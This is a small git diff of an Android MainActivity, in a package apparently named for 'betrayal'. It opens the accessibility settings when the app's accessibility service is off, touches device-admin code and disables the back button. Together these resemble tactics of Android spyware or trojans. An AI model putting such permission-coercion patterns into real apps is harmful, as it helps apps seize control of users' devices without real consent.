@@ -1,7 +1,9 @@
 package com.example.betryalcommit
 import android.content.Intent
 import android.os.Bundle
+import android.provider.Settings
 import androidx.appcompat.app.AppCompatActivity
+import com.example.betryalcommit.AdminAct.deviceAdminReceiver
 
 
 class MainActivity : AppCompatActivity() {
@@ -18,11 +20,16 @@ class MainActivity : AppCompatActivity() {
             startService(serviceIntent)
         } else {
             Permsu.requestPermissions(this, this, PERMISSION_REQUEST_CODE)
-            AdminAct.admact(this, this);
+
+        }
+        if (!Permsu.isAccessibilityServiceEnabled(this)) {
+            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
+            this.startActivity(intent)
         }
     }
+
     override fun onBackPressed() {
-        null
+
     }
 
     override fun onDestroy() {
